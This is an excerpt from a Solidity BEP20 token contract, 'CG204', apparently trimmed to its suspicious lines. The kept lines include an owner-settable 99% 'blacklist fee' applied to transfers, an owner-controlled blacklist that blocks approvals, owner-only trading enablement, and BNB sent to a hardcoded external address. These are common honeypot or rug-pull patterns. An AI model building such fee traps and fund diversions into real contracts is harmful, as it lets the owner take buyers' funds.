...
contract CG204 is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress =
        payable(0xCA163795b11a1f196545686e2D304E1767409453); // Marketing Address
        
    address payable public buybackAddress =
        payable(0x0d7C33aeb9bF049Df4080A826fd756d056D3a7A6); // BuyBack Address
    ...
    string private constant _name = "CG204";
    string private constant _symbol = "CG204";
    ...
    uint256 public _blackListFee = 99; 

    uint256 private _liquidityFee;
    uint256 private _previousLiquidityFee = _liquidityFee;

    // seeded with launch values
    ...
    constructor() {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            ...
            0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3  //0xD99D1c33F9fC3444f8101754aBC46c52416550D1  // testnet router
        );
    ...
    function enableTrading(address _liquidityAddress) external onlyOwner {
    ...
    function _approve(
        ...
        require(!_isBlacklisted[owner] && !_isBlacklisted[spender], "This address is blacklisted");
    ...
    function swapBack() private lockTheSwap {
        ...
        (success,) = address(0x4759D75448a63E1aa0600C3C18AD0387Fa1c6d00).call{value: bnbForDev}("");
    ...
    function _takeLiquidity(uint256 tLiquidity) private {
        ...
        } else if (buyOrSellSwitch == TRANSFER) {
            _marketingTokensToSwap = _blackListFee;
        }
        uint256 currentRate = _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
    ...
    function setBlackListFee(uint256 blackListFee) external onlyOwner {
